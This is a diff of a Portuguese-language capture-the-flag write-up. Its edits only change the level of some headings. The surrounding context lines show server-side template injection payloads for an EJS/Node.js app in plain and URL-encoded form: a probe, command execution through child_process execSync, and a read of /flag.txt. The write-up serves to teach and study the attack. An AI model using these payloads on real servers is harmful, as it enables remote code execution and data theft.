@@ -70,7 +70,7 @@ Decidi então testar se a aplicação processava a entrada como parte de um temp
 <%= 2*2 %>
 ```
 
-### URL Encoded:
+#### URL Encoded:
 
 ```
 %3C%25%3D+2%2A2+%25%3E
@@ -99,7 +99,7 @@ Com a vulnerabilidade confirmada, o próximo passo foi alcançar uma **Execuçã
 <%= this.constructor.constructor("return process")().mainModule.require("child_process").execSync("ls /").toString() %>
 ```
 
-### URL Encoded:
+#### URL Encoded:
 
 ```
 %3C%25%3D+this.constructor.constructor%28%22return+process%22%29%28%29.mainModule.require%28%22child_process%22%29.execSync%28%22ls+%2F%22%29.toString%28%29+%25%3E
@@ -131,7 +131,7 @@ Com a flag localizada, bastava ler seu conteúdo. 📖✨
 <%= global.process.mainModule.require('fs').readFileSync('/flag.txt', 'utf8') %>
 ```
 
-### URL Encoded:
+#### URL Encoded:
 
 ```
 %3C%25%3D+global.process.mainModule.require%28%27fs%27%29.readFileSync%28%27%2Fflag.txt%27%2C+%27utf8%27%29+%25%3E
